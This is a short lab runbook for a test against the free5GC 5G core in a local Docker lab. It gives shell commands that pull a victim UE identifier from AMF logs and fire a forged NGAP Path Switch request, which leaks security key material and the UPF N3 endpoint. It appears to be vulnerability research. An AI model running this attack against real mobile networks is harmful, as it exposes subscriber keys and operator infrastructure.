# free5GC — Path Switch → {NH,NCC} + UPF N3 disclosure (T01)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).
free5GC leaks MORE than Open5GS (non-empty ACK transfer → also the UPF N3 endpoint).

**1. Core + RAN**
```bash
( cd ../5g-lab && ./scripts/core.sh up free5gc && ./scripts/ran.sh up ueransim free5gc )
# free5GC is clock-sensitive: if the UE won't register / ping fails ->
#   ../5g-lab/scripts/fix-clock.sh ; docker restart ueransim-free5gc-ueransim-gnb-1; sleep 6; docker restart ueransim-free5gc-ueransim-ue-1
```
**2. Victim AMF-UE-NGAP-ID** (free5GC logs it as `AU:<n>`)
```bash
V=$(docker logs f5gc-amf 2>&1 | grep -oE 'AU:[0-9]+' | tail -1 | grep -oE '[0-9]+'); echo $V
```
**3. Capture + fire**
```bash
CFG_CORE=free5gc ./capture_attack.sh free5gc_T01_path_switch_key_n3_disclosure \
    f5gc-amf f5gc-smf ueransim-free5gc-ueransim-gnb-1 net-5glab 30 \
    -- path-switch --source-amf-ue-id $V --teid 0x11111111
```
**Expect:** NGAP **21 + 25** in `amf_ngap_nas_sbi.pcap`; `attack.jsonl` shows `LEAKED KEY
MATERIAL` **and** `LEAKED UPF N3 ENDPOINT 172.30.20.11 TEID=..`; SMF pcap has the SBI+PFCP tail.
**Restore:** `docker restart ueransim-free5gc-ueransim-ue-1`
